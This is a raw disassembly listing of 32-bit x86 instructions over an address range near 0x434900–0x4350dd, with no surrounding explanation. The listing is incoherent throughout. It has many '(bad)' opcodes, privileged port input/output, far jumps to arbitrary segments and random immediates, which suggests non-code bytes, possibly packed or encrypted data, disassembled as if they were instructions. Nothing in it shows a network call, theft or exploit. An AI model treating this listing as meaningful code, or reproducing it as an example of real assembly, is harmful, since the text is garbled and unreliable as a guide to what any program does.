  4348f5:	arpl   WORD PTR [ecx],dx
  4348f7:	push   ecx
  4348f8:	outs   dx,DWORD PTR ds:[esi]
  4348f9:	mov    ds:0xeb081c33,al
  4348fe:	or     BYTE PTR [ebx+eiz*8],cl
  434901:	inc    esp
  434902:	out    0x5,al
  434904:	in     eax,0xac
  434906:	scas   al,BYTE PTR es:[edi]
  434907:	hlt    
  434908:	jp     0x434967
  43490a:	and    DWORD PTR [ebx+0x24b4ec22],edx
  434910:	jmp    0x434915
  434912:	imul   ebp,edx,0x30964836
  434918:	lea    esp,[ebp-0x70caeefd]
  43491e:	cwde   
  43491f:	pop    ss
  434920:	sbb    edi,DWORD PTR [ecx]
  434922:	sbb    esi,DWORD PTR [esi+edx*1-0x792131da]
  434929:	mov    ch,BYTE PTR [edx+edx*1-0x25]
  43492d:	sbb    al,0x6b
  43492f:	add    al,0x1d
  434931:	lods   eax,DWORD PTR ds:[esi]
  434932:	lods   al,BYTE PTR ds:[esi]
  434933:	dec    ebp
  434934:	cmp    eax,0xaf10b8df
  434939:	stos   DWORD PTR es:[edi],eax
  43493a:	(bad)  
  43493b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43493c:	inc    edx
  43493d:	cmc    
  43493e:	fbld   TBYTE PTR [ebp-0x4c446682]
  434944:	push   0xdf30606a
  434949:	cmp    ecx,ecx
  43494b:	or     BYTE PTR [edx-0x23],bl
  43494e:	mov    ah,0x64
  434950:	lds    ecx,FWORD PTR [esi+0x5579975c]
  434956:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  434958:	xchg   esp,eax
  434959:	sahf   
  43495a:	les    edi,FWORD PTR [ebx+edi*8-0x60]
  43495e:	mov    ecx,0x7f7caa0f
  434963:	and    BYTE PTR ds:0xc2f3906e,0xb8
  43496a:	fld    DWORD PTR [ebp+0x67bb9f85]
  434970:	je     0x434966
  434972:	and    DWORD PTR [edi-0x8efe177],0x14bbb781
  43497c:	jno    0x4349fb
  43497e:	push   ss
  43497f:	jle    0x4349f8
  434981:	(bad)  
  434983:	adc    BYTE PTR [esi-0x453443ae],al
  434989:	call   0x4be6:0xa9b4aeb0
  434990:	(bad)  
  434991:	call   0x146d:0xd7f8ca63
  434998:	jge    0x43493d
  43499a:	sti    
  43499b:	mov    ah,0xb8
  43499d:	mov    esi,ecx
  43499f:	xor    esi,ebx
  4349a1:	out    dx,eax
  4349a2:	cwde   
  4349a3:	inc    edi
  4349a4:	clc    
  4349a5:	mov    bl,0xbe
  4349a7:	xchg   esp,eax
  4349a8:	test   eax,0x5522137d
  4349ad:	sbb    eax,0x7706eb00
  4349b2:	clc    
  4349b3:	add    esp,DWORD PTR [eax]
  4349b5:	mov    ecx,0x74797f24
  4349ba:	jmp    0x9c8f:0x5b9b84bf
  4349c1:	sti    
  4349c2:	jmp    0x434a19
  4349c4:	cs fsub st(0),st
  4349c7:	lods   al,BYTE PTR ds:[esi]
  4349c8:	mov    edi,0x1a35aadf
  4349cd:	cld    
  4349ce:	es add al,0x20
  4349d1:	scas   eax,DWORD PTR es:[edi]
  4349d2:	out    0xf9,al
  4349d4:	in     eax,0x17
  4349d6:	shl    esp,cl
  4349d8:	add    BYTE PTR [esp+ecx*1-0x5c66a423],bh
  4349df:	fsub   st,st(6)
  4349e1:	dec    ebp
  4349e2:	rcr    edi,cl
  4349e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4349e5:	loope  0x434997
  4349e7:	ror    BYTE PTR ds:0x18595f91,0x21
  4349ee:	push   ss
  4349ef:	sub    eax,0xc5c88a5b
  4349f4:	cli    
  4349f5:	dec    ecx
  4349f6:	pop    es
  4349f7:	ja     0x4349fc
  4349f9:	fwait
  4349fa:	mov    ch,0x39
  4349fc:	xchg   edx,eax
  4349fd:	fbstp  TBYTE PTR ds:0x92649516
  434a03:	out    dx,al
  434a04:	div    BYTE PTR ds:0x591b8c0a
  434a0a:	mov    edx,0x7f2d3226
  434a0f:	jmp    0xf5dee955
  434a14:	retf   
  434a15:	mov    ch,0x70
  434a17:	xchg   esp,eax
  434a18:	retf   0x1eb9
  434a1b:	mov    WORD PTR [edi],es
  434a1d:	sbb    esi,DWORD PTR [ecx-0x5a]
  434a20:	std    
  434a21:	out    dx,al
  434a22:	mov    ecx,0x6ba67b18
  434a27:	xor    esp,DWORD PTR [ecx]
  434a29:	fwait
  434a2a:	xchg   ah,bh
  434a2c:	mov    bl,0x1c
  434a2e:	pop    ebp
  434a2f:	pushf  
  434a30:	mov    al,0xc7
  434a32:	mov    ebp,0x1c886cd4
  434a37:	or     DWORD PTR [ebp+0x31ec772b],eax
  434a3d:	loop   0x4349ee
  434a3f:	or     al,0x85
  434a41:	xchg   edx,ebp
  434a43:	push   es
  434a44:	lea    eax,[edx+ebp*4+0x16]
  434a48:	inc    esi
  434a49:	cmp    eax,0xa6dca105
  434a4e:	mov    ebx,0xbd5f86a3
  434a53:	dec    esi
  434a54:	adc    al,0x52
  434a56:	inc    esp
  434a57:	jle    0x434acf
  434a59:	or     edx,0xaff85004
  434a5f:	mov    ebx,0xf16c531f
  434a64:	cmp    eax,ebp
  434a66:	imul   ecx,DWORD PTR [ecx+0x7cb87e10],0xfffffff4
  434a6d:	retf   
  434a6e:	jo     0x434a1b
  434a70:	mov    edx,0x9e254b1c
  434a75:	shl    BYTE PTR [ecx-0x41865da8],cl
  434a7b:	mov    BYTE PTR ds:0x49f470da,dh
  434a81:	mov    esp,0x5923f976
  434a86:	push   edx
  434a87:	jae    0x434ae0
  434a89:	cmp    DWORD PTR [esp+eiz*8],edi
  434a8c:	sbb    BYTE PTR [ecx+0x36e2ec3b],0xe4
  434a93:	sub    ah,BYTE PTR [ebp+0x31a6c9a4]
  434a99:	aas    
  434a9a:	sub    eax,0x32d61925
  434a9f:	xchg   ebx,eax
  434aa0:	cli    
  434aa1:	push   ds
  434aa2:	mul    esi
  434aa4:	mov    ch,0x89
  434aa6:	cmp    al,0xe5
  434aa8:	push   0x70
  434aaa:	xor    edx,DWORD PTR [ebp+0x669a591e]
  434ab0:	inc    esi
  434ab1:	push   es
  434ab2:	shr    bh,0xac
  434ab5:	mov    bl,0x3b
  434ab7:	ins    BYTE PTR es:[edi],dx
  434ab8:	cmp    cl,ah
  434aba:	stc    
  434abb:	mov    edi,0xb3581fdb
  434ac0:	push   ds
  434ac1:	and    eax,0x12c78492
  434ac6:	bound  ebp,QWORD PTR [eiz*8+0x63eaa49a]
  434acd:	adc    ah,BYTE PTR [ecx]
  434acf:	adc    BYTE PTR [ecx],ah
  434ad1:	sbb    DWORD PTR [edx-0x477b4398],ecx
  434ad7:	rcl    ebp,cl
  434ad9:	ss sub al,0x92
  434adc:	or     ebx,DWORD PTR [ecx+0xf]
  434adf:	mov    ah,0x5c
  434ae1:	call   0xf561:0x491f34b1
  434ae8:	jns    0x434b0c
  434aea:	push   ecx
  434aeb:	mov    dl,0x72
  434aed:	(bad)  
  434aee:	jmp    0x434b00
  434af0:	add    al,0xe9
  434af2:	mov    ds:0x6847c0f3,al
  434af7:	xchg   DWORD PTR [eax],ebx
  434af9:	xchg   ebx,eax
  434afa:	mov    ebx,0xb4f6fb28
  434aff:	aam    0x5d
  434b01:	daa    
  434b02:	jne    0x434aa3
  434b04:	mov    dh,0xce
  434b06:	or     al,0x15
  434b08:	dec    ebx
  434b09:	sub    edx,edx
  434b0b:	xchg   ebp,eax
  434b0c:	bound  eax,QWORD PTR [eax+esi*1-0x480acb71]
  434b13:	hlt    
  434b14:	addr16 jl 0x434b5e
  434b17:	mov    bl,0x65
  434b19:	retf   
  434b1a:	and    ch,ah
  434b1c:	jecxz  0x434b91
  434b1e:	adc    esp,DWORD PTR [eax+0x1b]
  434b21:	cdq    
  434b22:	add    BYTE PTR [ebx*2+0x7249b0ea],0xb4
  434b2a:	jb     0x434b59
  434b2c:	das    
  434b2d:	mov    ds:0xac9266db,eax
  434b32:	fbstp  TBYTE PTR [edx-0x60]
  434b35:	or     al,0x67
  434b37:	and    bl,BYTE PTR ds:0x1e3522b4
  434b3d:	and    DWORD PTR [ebx],ecx
  434b3f:	loope  0x434bc0
  434b41:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  434b42:	mov    ebp,DWORD PTR [edx+0x757ef163]
  434b48:	cld    
  434b49:	xlat   BYTE PTR ds:[ebx]
  434b4a:	js     0x434b33
  434b4c:	cmp    ebx,DWORD PTR [ecx]
  434b4e:	mov    esp,0x3bb25264
  434b53:	mov    cs,WORD PTR [ecx-0x1455e7db]
  434b59:	dec    ebp
  434b5a:	mov    esp,0x108f8b7c
  434b5f:	mov    dl,0x40
  434b61:	aas    
  434b62:	mov    bh,0x4
  434b64:	cmp    al,0x74
  434b66:	or     DWORD PTR [edx-0x3fce8adf],edi
  434b6c:	sbb    BYTE PTR [ecx-0xa],bh
  434b6f:	stos   DWORD PTR es:[edi],eax
  434b70:	ret    0x5450
  434b73:	xor    bh,BYTE PTR [ecx]
  434b75:	sub    dh,cl
  434b77:	jmp    0xba68f278
  434b7c:	out    dx,al
  434b7d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  434b7e:	or     edi,DWORD PTR [ebx]
  434b80:	add    al,al
  434b82:	fs clc 
  434b84:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  434b85:	out    dx,eax
  434b86:	ins    DWORD PTR es:[edi],dx
  434b87:	outs   dx,BYTE PTR ds:[esi]
  434b88:	xchg   esi,eax
  434b89:	inc    edi
  434b8a:	mov    eax,0xf7493424
  434b8f:	mov    eax,ebp
  434b91:	mov    ebp,0xc7ce4ccb
  434b96:	ds jns 0x434bb1
  434b99:	icebp  
  434b9a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  434b9b:	push   ebx
  434b9c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  434b9d:	pop    eax
  434b9e:	stos   DWORD PTR es:[edi],eax
  434b9f:	adc    bl,ch
  434ba1:	ret    0xd4bd
  434ba4:	lds    edi,FWORD PTR [edi+0x7b]
  434ba7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  434ba8:	inc    esi
  434ba9:	push   ecx
  434baa:	test   eax,0xd5cd9524
  434baf:	inc    edi
  434bb0:	sbb    al,0x9f
  434bb2:	aaa    
  434bb3:	jno    0x434b91
  434bb5:	adc    BYTE PTR [eax-0x30c57e8c],bh
  434bbb:	pop    edx
  434bbc:	lds    esp,FWORD PTR [ecx-0x48f58c35]
  434bc2:	push   esi
  434bc3:	leave  
  434bc4:	or     al,0xd9
  434bc6:	mov    ch,0xd1
  434bc8:	clc    
  434bc9:	push   edx
  434bca:	mov    dl,0x54
  434bcc:	out    dx,eax
  434bcd:	in     al,dx
  434bce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  434bcf:	gs inc ebp
  434bd1:	test   eax,0x1bfbebfe
  434bd6:	mov    edx,0xf804d5c
  434bdb:	dec    eax
  434bdc:	and    esi,DWORD PTR [edi+ebp*1-0x45fb7c9b]
  434be3:	popf   
  434be4:	call   0x161020ff
  434be9:	cs es jmp 0x434baa
  434bed:	pop    edi
  434bee:	cdq    
  434bef:	mov    ebx,0xe4b0d072
  434bf4:	mov    edx,0x5544ab52
  434bf9:	bound  ebp,QWORD PTR [eax+0x51a519e6]
  434bff:	inc    edi
  434c00:	fild   WORD PTR [eax]
  434c02:	jmp    0x9497:0xa1a1f1f6
  434c09:	popf   
  434c0a:	cmp    DWORD PTR [edx+0x683d29bb],eax
  434c10:	fiadd  DWORD PTR ds:0x65b1f4b2
  434c16:	dec    esp
  434c17:	stos   DWORD PTR es:[edi],eax
  434c18:	and    eax,0x92a35a79
  434c1d:	out    dx,eax
  434c1e:	ret    
  434c1f:	jae    0x434c69
  434c21:	cdq    
  434c22:	dec    ebx
  434c23:	sbb    al,ah
  434c25:	sbb    esp,0xffffff95
  434c28:	sbb    DWORD PTR [eax+0x7e],esi
  434c2b:	imul   dx,WORD PTR [esi-0x749f1b45],0xdc7c
  434c34:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  434c35:	(bad)  
  434c36:	aam    0xe6
  434c38:	adc    ecx,edi
  434c3a:	xchg   ebp,eax
  434c3b:	outs   dx,DWORD PTR ds:[esi]
  434c3c:	xchg   edi,eax
  434c3d:	push   0x491e9911
  434c42:	rol    bl,cl
  434c44:	ss inc ebx
  434c46:	jl     0x434be1
  434c48:	mov    al,ds:0x5d350d71
  434c4d:	popf   
  434c4e:	pop    ds
  434c4f:	retf   
  434c50:	mov    al,ds:0x60faef8c
  434c55:	add    BYTE PTR [esp+ebx*1],dh
  434c58:	adc    al,0xa7
  434c5a:	mov    esi,0x27770b4
  434c5f:	rcl    ch,0x5d
  434c62:	je     0x434c53
  434c64:	sbb    ebx,DWORD PTR ds:0x916f030
  434c6a:	sub    BYTE PTR [edi+0x4],cl
  434c6d:	(bad)  
  434c6e:	test   al,0xf5
  434c70:	jmp    0xf0ed:0xb21b0ba5
  434c77:	mov    cl,0xc5
  434c79:	call   0x524324b0
  434c7e:	mov    edx,0x3144e854
  434c83:	or     al,0x5
  434c85:	nop
  434c86:	imul   ebp,ebx,0x90006a53
  434c8c:	push   ss
  434c8d:	sub    DWORD PTR [ebp+esi*1+0x7eab1c5c],edx
  434c94:	cli    
  434c95:	call   0x5e1a:0x15cb96fb
  434c9c:	and    eax,esp
  434c9e:	aad    0x1e
  434ca0:	adc    DWORD PTR [esi-0x40989b46],esi
  434ca6:	fadd   st(0),st
  434ca8:	xor    eax,0x3e890b9e
  434cad:	nop
  434cae:	lods   eax,DWORD PTR ds:[esi]
  434caf:	nop
  434cb0:	pop    esp
  434cb1:	dec    ebp
  434cb2:	ins    DWORD PTR es:[edi],dx
  434cb3:	adc    eax,0xe4b4b813
  434cb8:	call   0x23b1e78
  434cbd:	pushf  
  434cbe:	shl    DWORD PTR [edi+edx*8+0x58],0xb8
  434cc3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  434cc4:	or     BYTE PTR [edx],cl
  434cc6:	stos   DWORD PTR es:[edi],eax
  434cc7:	sub    DWORD PTR [edi],esp
  434cc9:	adc    al,0xd8
  434ccb:	shl    BYTE PTR [eax+ebp*1],cl
  434cce:	imul   edx,DWORD PTR [edx-0x59446442],0x70048f86
  434cd8:	scas   eax,DWORD PTR es:[edi]
  434cd9:	xchg   dh,ch
  434cdb:	push   edx
  434cdc:	fld    DWORD PTR [esi+0x5d37d591]
  434ce2:	fsubr  st,st(6)
  434ce4:	test   BYTE PTR [eax],ah
  434ce6:	shr    DWORD PTR [ebx+0x35],cl
  434ce9:	test   DWORD PTR [edi],esi
  434ceb:	repnz mov dh,0xbf
  434cee:	pop    esp
  434cef:	push   ecx
  434cf0:	sbb    DWORD PTR [ecx-0x77f31e0e],ebp
  434cf6:	add    ecx,DWORD PTR [edx]
  434cf8:	mov    esi,0xa8c29c8a
  434cfd:	xchg   edx,eax
  434cfe:	repz imul ecx,DWORD PTR [edx-0x24],0xffffffbd
  434d03:	nop
  434d04:	and    BYTE PTR [ecx+0x61],bh
  434d07:	pushf  
  434d08:	push   edx
  434d09:	cwde   
  434d0a:	pop    esp
  434d0b:	repz mov ds:0x45b57b9b,eax
  434d11:	leave  
  434d12:	xchg   esi,eax
  434d13:	ret    
  434d14:	sahf   
  434d15:	sbb    eax,0xed6969f1
  434d1a:	leave  
  434d1b:	test   BYTE PTR [ebp-0x44],cl
  434d1e:	dec    esp
  434d1f:	scas   eax,DWORD PTR es:[edi]
  434d20:	dec    edx
  434d21:	pop    ss
  434d22:	mov    esp,0xc3142fb3
  434d27:	xlat   BYTE PTR ds:[ebx]
  434d28:	cwde   
  434d29:	test   al,0xa
  434d2b:	jmp    0x434d4e
  434d2d:	test   eax,0xfdf38c4b
  434d32:	(bad)  
  434d33:	fiadd  DWORD PTR [esi+0x3e35aba4]
  434d39:	fcomp  DWORD PTR [edi]
  434d3b:	in     al,0xae
  434d3d:	mov    ss,WORD PTR [esi-0x4dc2556e]
  434d43:	in     al,0x6b
  434d45:	or     bl,BYTE PTR [eax-0x6a]
  434d48:	xor    eax,0x3dea7ae7
  434d4d:	push   0x4216cfed
  434d52:	ss pop ebx
  434d54:	adc    ebx,ebp
  434d56:	mov    dh,0x64
  434d58:	scas   eax,DWORD PTR es:[edi]
  434d59:	stos   BYTE PTR es:[edi],al
  434d5a:	mov    bh,0x96
  434d5c:	lds    esp,FWORD PTR [edi]
  434d5e:	and    eax,esi
  434d60:	dec    edi
  434d61:	adc    ah,BYTE PTR [eax+0x1b4924be]
  434d67:	mov    ebx,0x94480f37
  434d6c:	popf   
  434d6d:	mov    eax,ds:0x3825d9b9
  434d72:	jl     0x434d67
  434d74:	cld    
  434d75:	dec    ebp
  434d76:	pop    ds
  434d77:	(bad)  
  434d78:	pop    ds
  434d79:	jns    0x434df3
  434d7b:	test   ebp,ebp
  434d7d:	sbb    DWORD PTR [eax],ecx
  434d7f:	hlt    
  434d80:	ret    
  434d81:	ret    
  434d82:	repnz adc DWORD PTR ds:0x8e7075b,0x2f20449d
  434d8d:	cdq    
  434d8e:	(bad)  
  434d8f:	jecxz  0x434d89
  434d91:	jmp    0xd147:0xb5e57b65
  434d98:	test   DWORD PTR [edx+eiz*1-0x14],esp
  434d9c:	mov    eax,0x20d6ff93
  434da1:	test   eax,0x29e9df3f
  434da6:	aad    0x8f
  434da8:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  434daa:	dec    ebx
  434dab:	pop    ss
  434dac:	outs   dx,DWORD PTR ds:[esi]
  434dad:	arpl   WORD PTR [eax],dx
  434daf:	xlat   BYTE PTR ds:[ebx]
  434db0:	adc    BYTE PTR [ebp+0x2aee1c1a],bh
  434db6:	mov    cl,0xe4
  434db8:	aas    
  434db9:	shl    BYTE PTR [ecx+0x77],1
  434dbc:	and    eax,0xf4ed3a3d
  434dc1:	push   edi
  434dc2:	mov    ds:0xd2cb1147,eax
  434dc7:	dec    esi
  434dc8:	and    DWORD PTR [ecx-0x348a90a3],esi
  434dce:	push   ds
  434dcf:	push   0x84dacd59
  434dd4:	adc    cl,bh
  434dd6:	imul   edx,DWORD PTR ds:0xecbf39da,0xfffffff0
  434ddd:	cli    
  434dde:	mov    ebx,0xf7911abf
  434de3:	ror    BYTE PTR [eax],1
  434de5:	xchg   DWORD PTR [eax],edi
  434de7:	loope  0x434daf
  434de9:	dec    ebx
  434dea:	add    eax,0x940ed6d8
  434def:	push   ss
  434df0:	and    esp,DWORD PTR [ebp-0x21278e5e]
  434df6:	mov    esi,DWORD PTR [esi-0x36]
  434df9:	pushf  
  434dfa:	cmp    ebp,DWORD PTR [edx-0x10]
  434dfd:	push   ebx
  434dfe:	jmp    0xebe40322
  434e03:	add    dh,0x60
  434e06:	(bad)  
  434e07:	(bad)  
  434e08:	push   0xffffffd0
  434e0a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  434e0b:	adc    eax,DWORD PTR [esi-0x339b4d38]
  434e11:	cli    
  434e12:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  434e13:	fisub  WORD PTR [esi-0x6fbe68bc]
  434e19:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  434e1a:	jae    0x434e55
  434e1c:	or     ah,BYTE PTR ds:0x6b8698f
  434e22:	mov    ch,0xa4
  434e24:	sbb    eax,0xc94469db
  434e29:	popa   
  434e2a:	xadd   DWORD PTR [ebx-0x149b4f45],ecx
  434e31:	cld    
  434e32:	push   0xffffffb6
  434e34:	push   edi
  434e35:	imul   esi,DWORD PTR [ebp+0x328f9484],0xb9d6409
  434e3f:	push   cs
  434e40:	jns    0x434e20
  434e42:	imul   esp,esp,0xc30d3214
  434e48:	mov    DWORD PTR [ecx],ebx
  434e4a:	mov    ecx,0x552c7064
  434e4f:	loope  0x434ec6
  434e51:	adc    dh,BYTE PTR [edx]
  434e53:	out    dx,eax
  434e54:	push   edx
  434e55:	dec    edi
  434e56:	inc    edi
  434e57:	mov    cl,0x1c
  434e59:	test   eax,0x1d292b36
  434e5e:	sti    
  434e5f:	jmp    0x434e48
  434e61:	imul   ecx,DWORD PTR [ebp+0xba3e505],0x8
  434e68:	retf   0xd3b5
  434e6b:	pop    ecx
  434e6c:	sbb    BYTE PTR [ecx-0xeeafd37],bl
  434e72:	gs (bad) 
  434e74:	push   0x15102b9d
  434e79:	and    ch,bl
  434e7b:	xor    BYTE PTR [edi],cl
  434e7d:	jmp    0x15edcd65
  434e82:	mov    ebx,0xb3b86704
  434e87:	pop    esi
  434e88:	sub    eax,0xc30e7bc7
  434e8d:	xor    ebp,edi
  434e8f:	pop    ebx
  434e90:	sbb    esi,DWORD PTR [edi]
  434e92:	js     0x434e34
  434e94:	sbb    bl,BYTE PTR [ecx+0x44]
  434e97:	mov    bh,BYTE PTR [ebx+0x1a]
  434e9a:	inc    ebx
  434e9b:	test   DWORD PTR [ebp-0x79b0d465],esi
  434ea1:	sar    ch,1
  434ea3:	jb     0x434e87
  434ea5:	shl    BYTE PTR [edx+edi*4-0x4c],0x7e
  434eaa:	(bad)  
  434eab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  434eac:	pushf  
  434ead:	shr    BYTE PTR [edx+0x3],1
  434eb0:	sbb    DWORD PTR [ebp+0x579a323b],esp
  434eb6:	mov    esi,ebx
  434eb8:	add    ebx,esi
  434eba:	pusha  
  434ebb:	das    
  434ebc:	mov    edi,0x379689b9
  434ec1:	ret    0x10bf
  434ec4:	cs fwait
  434ec6:	sbb    ebp,DWORD PTR [ecx-0xb28de3a]
  434ecc:	inc    esi
  434ecd:	adc    al,0xf
  434ecf:	jae    0x434e99
  434ed1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  434ed2:	jnp    0x434f3d
  434ed4:	in     al,dx
  434ed5:	out    0x68,al
  434ed7:	mov    al,ds:0x21452074
  434edc:	sub    ebx,DWORD PTR ss:[edi-0x44a197e1]
  434ee3:	popf   
  434ee4:	jns    0x434e9b
  434ee6:	scas   eax,DWORD PTR es:[edi]
  434ee7:	add    eax,esp
  434ee9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  434eea:	fdiv   DWORD PTR [edx+edx*4]
  434eed:	dec    ecx
  434eee:	mov    eax,ds:0x7cc9f45c
  434ef3:	sbb    bh,bh
  434ef5:	pop    ebx
  434ef6:	mov    esi,0xa2999520
  434efb:	jmp    0x491e:0x264120bc
  434f02:	inc    ebp
  434f03:	stos   BYTE PTR es:[edi],al
  434f04:	mov    al,0x56
  434f06:	push   edi
  434f07:	test   al,0xaf
  434f0a:	dec    ebx
  434f0b:	lods   eax,DWORD PTR ds:[esi]
  434f0c:	fstp   QWORD PTR [eiz*4-0x6a0472a]
  434f13:	arpl   WORD PTR ds:0x540edecb,cx
  434f19:	ror    DWORD PTR [ebp+0x81ef6ae],1
  434f1f:	xchg   ebp,eax
  434f20:	iret   
  434f21:	pushf  
  434f22:	ss pop ss
  434f24:	xchg   esi,eax
  434f25:	lods   eax,DWORD PTR ds:[esi]
  434f26:	je     0x434f55
  434f28:	aaa    
  434f29:	pushf  
  434f2a:	mov    bl,0xf8
  434f2c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  434f2d:	repnz xchg edi,eax
  434f2f:	jns    0x434f54
  434f31:	cdq    
  434f32:	fnstenv [edx+0x71]
  434f35:	push   ebx
  434f36:	dec    ecx
  434f37:	fidiv  DWORD PTR [eax]
  434f39:	sahf   
  434f3a:	jnp    0x434ebd
  434f3c:	jmp    0xd54:0x2e6e2e0f
  434f43:	jge    0x434f90
  434f45:	mov    esi,0x9cc1c590
  434f4a:	aas    
  434f4b:	lock jno 0x434ece
  434f4e:	dec    esp
  434f4f:	scas   eax,DWORD PTR es:[edi]
  434f50:	lods   al,BYTE PTR ds:[esi]
  434f51:	push   0x4d
  434f53:	cdq    
  434f54:	(bad)  
  434f55:	js     0x434f08
  434f57:	js     0x434f87
  434f59:	mov    DWORD PTR ds:0x80ba2296,esp
  434f5f:	std    
  434f60:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  434f61:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  434f63:	xlat   BYTE PTR ds:[ebx]
  434f64:	push   ebp
  434f65:	sub    ah,dl
  434f67:	out    0x43,al
  434f69:	xor    BYTE PTR [esi+0x58],bh
  434f6c:	sbb    ebp,ecx
  434f6e:	inc    edx
  434f6f:	aad    0x10
  434f71:	fwait
  434f72:	mov    WORD PTR [esi-0x11a50296],cs
  434f78:	dec    ebp
  434f79:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  434f7a:	retf   
  434f7b:	push   ebx
  434f7c:	cmp    esp,edi
  434f7e:	jl     0x434f22
  434f80:	enter  0xb872,0x22
  434f84:	sub    edi,DWORD PTR [esi-0x3c]
  434f87:	aam    0x3b
  434f89:	pushf  
  434f8a:	std    
  434f8b:	sub    eax,0x1b51b82
  434f90:	and    eax,0x55fbdc54
  434f95:	push   edx
  434f96:	pusha  
  434f97:	cmp    al,0x53
  434f99:	fwait
  434f9a:	xor    cl,0x95
  434f9d:	or     BYTE PTR [esi-0x6a],dh
  434fa0:	sbb    ebx,0xbd45a319
  434fa6:	fs call 0x85115bf3
  434fac:	mul    ebp
  434fae:	mov    edi,0x305d29e0
  434fb3:	out    dx,al
  434fb4:	aas    
  434fb5:	mov    cl,0xb3
  434fb7:	(bad)  
  434fb8:	sbb    ecx,DWORD PTR [ecx]
  434fba:	aad    0xc2
  434fbc:	push   eax
  434fbd:	into   
  434fbe:	outs   dx,DWORD PTR ds:[esi]
  434fbf:	ss mov edx,0xd7a46c7e
  434fc5:	vmread esp,ebx
  434fc8:	xchg   edx,eax
  434fc9:	imul   edi,DWORD PTR [eax-0x5c0d660c],0xb0ec93db
  434fd3:	add    al,0x74
  434fd5:	mov    al,0x2
  434fd7:	pop    edi
  434fd8:	sbb    DWORD PTR [edx+edi*2+0x79],edx
  434fdc:	push   ecx
  434fdd:	dec    ebp
  434fde:	mov    bh,0x5c
  434fe0:	pop    ss
  434fe1:	into   
  434fe2:	(bad)  
  434fe3:	(bad)  
  434fe4:	das    
  434fe5:	pop    ds
  434fe6:	mov    ebx,0xf77fa554
  434feb:	mov    BYTE PTR [ebp+0x72f0c89c],al
  434ff1:	imul   ebx,DWORD PTR [eax+0x55],0x27
  434ff5:	imul   eax,DWORD PTR [eax],0xeed3beff
  434ffb:	imul   ebx,DWORD PTR [edi],0xe5e0daef
  435001:	sbb    BYTE PTR [ebx-0x16],0x33
  435005:	into   
  435006:	(bad)  
  435007:	jmp    0x25dc592a
  43500c:	cld    
  43500d:	xor    bh,BYTE PTR [esi+0x5d]
  435010:	iret   
  435011:	lahf   
  435012:	imul   ebp,DWORD PTR [eax],0xffffffb1
  435015:	add    edx,DWORD PTR [eax+0xc0a7f76]
  43501b:	out    dx,al
  43501c:	jae    0x435083
  43501e:	mov    edx,0x79eeb394
  435023:	ret    0xeb05
  435026:	push   es
  435027:	out    0xe4,eax
  435029:	test   eax,0x2cc0a3e3
  43502e:	xchg   ebx,eax
  43502f:	dec    esi
  435030:	push   ebp
  435031:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  435032:	sub    al,0xf4
  435034:	and    eax,0x9d9f245d
  435039:	mov    al,ds:0xb335ac1b
  43503e:	pusha  
  43503f:	cmp    eax,0x4c09ccba
  435044:	daa    
  435045:	dec    eax
  435046:	mov    edx,0x85a115f4
  43504b:	je     0x435002
  43504d:	sbb    ebp,eax
  43504f:	in     al,dx
  435050:	fnstcw WORD PTR [ecx-0x27]
  435053:	or     bl,ah
  435055:	xchg   DWORD PTR [ebx],eax
  435057:	fs add al,0x12
  43505a:	mov    ebp,0xe256e894
  43505f:	adc    eax,0xaa9eb35b
  435064:	and    al,0xf7
  435066:	mov    bh,0xc4
  435068:	dec    edi
  435069:	outs   dx,DWORD PTR ds:[esi]
  43506a:	cmp    al,0x9e
  43506c:	jmp    DWORD PTR ds:0xbea904bf
  435072:	jecxz  0x4350cf
  435074:	inc    edi
  435075:	jae    0x4350e0
  435077:	mov    bl,0x7e
  435079:	test   DWORD PTR [ecx+0x58],esi
  43507c:	jmp    0x7f49:0x92e68197
  435083:	imul   esp,DWORD PTR [ecx+esi*8+0xba0f4da],0x26a4e0b6
  43508e:	sbb    edi,DWORD PTR [ecx+edi*1+0x56]
  435092:	push   eax
  435093:	js     0x435082
  435095:	dec    ebx
  435096:	cwde   
  435097:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  435098:	mov    ds:0x2274bde9,al
  43509d:	cdq    
  43509e:	lods   al,BYTE PTR ds:[esi]
  43509f:	mov    BYTE PTR [edi],bh
  4350a1:	retf   0xe1c7
  4350a4:	and    eax,0xc8480ba1
  4350a9:	xlat   BYTE PTR ds:[ebx]
  4350aa:	push   0xbad8a7d4
  4350af:	dec    eax
  4350b0:	sub    bh,BYTE PTR [ebx-0x5b48bb11]
  4350b6:	pop    ss
  4350b7:	test   al,0x8b
  4350b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4350ba:	dec    ebx
  4350bb:	retf   0x438e
  4350be:	iret   
  4350bf:	cmp    esp,esp
  4350c1:	leave  
  4350c2:	adc    BYTE PTR [esi+0x1c],ah
  4350c5:	mov    ds:0xead784bd,eax
  4350ca:	pop    eax
  4350cb:	xchg   esp,eax
  4350cc:	adc    eax,0xcbf0d12e
  4350d1:	or     bh,BYTE PTR [edi]
  4350d3:	mul    BYTE PTR ds:0x1db214c9
  4350d9:	fmul   st(0),st
  4350db:	std    
  4350dc:	inc    esi
  4350dd:	adc    edi,esp
